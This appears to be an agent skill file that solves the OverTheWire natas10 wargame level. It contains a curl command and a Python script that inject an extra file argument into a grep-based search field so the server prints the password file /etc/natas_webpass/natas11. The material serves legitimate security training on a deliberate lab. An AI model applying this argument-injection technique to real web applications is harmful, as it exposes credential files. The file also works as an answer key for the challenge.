---
name: natas-10
description: >-
  Use when solving OverTheWire natas10: given natas10 credentials, the ; | &
  filter is bypassed by passing grep an extra filename argument (.*
  /etc/natas_webpass/natas11) so grep reads the password file; extract the
  natas11 password.
---
# natas10

**Input:** username and password for natas10.

**Weakness:** natas10 blocks `;`, `|`, `&` (no command chaining), but still passes `needle` as arguments to `grep ... dictionary.txt`. Give grep a pattern that matches anything (`.*`) plus an extra file path, so grep also reads `/etc/natas_webpass/natas11` and prints its line.

**Network:** run on a host that can reach `natas10.natas.labs.overthewire.org`. On Windows PowerShell use `python` / `curl.exe`, not the `curl` alias.

## Steps

1. One-shot with curl.exe:

```bash
curl.exe -s -u USER:PASS http://natas10.natas.labs.overthewire.org/ \
  --get --data-urlencode "needle=.* /etc/natas_webpass/natas11 #" --data-urlencode "submit=Search"
```

The output includes a line `/etc/natas_webpass/natas11:<password>`.

2. Derive it programmatically (never hardcode it). Save this as `solve.py` and run `python solve.py USER PASS`:

```python
#!/usr/bin/env python3
import base64, re, sys, urllib.parse, urllib.request
user, password = sys.argv[1], sys.argv[2]
auth = "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()
base = "http://natas10.natas.labs.overthewire.org"
qs = urllib.parse.urlencode({"needle": ".* /etc/natas_webpass/natas11 #", "submit": "Search"})
req = urllib.request.Request(f"{base}/?{qs}", headers={"Authorization": auth})
html = urllib.request.urlopen(req, timeout=30).read().decode()
print(re.search(r"/etc/natas_webpass/natas11:([A-Za-z0-9]{32})", html).group(1))
```

3. The printed string is the natas11 password.

4. Confirm by GETting `http://natas11.natas.labs.overthewire.org/` with Basic Auth `natas11:<password>` and expecting HTTP 200.
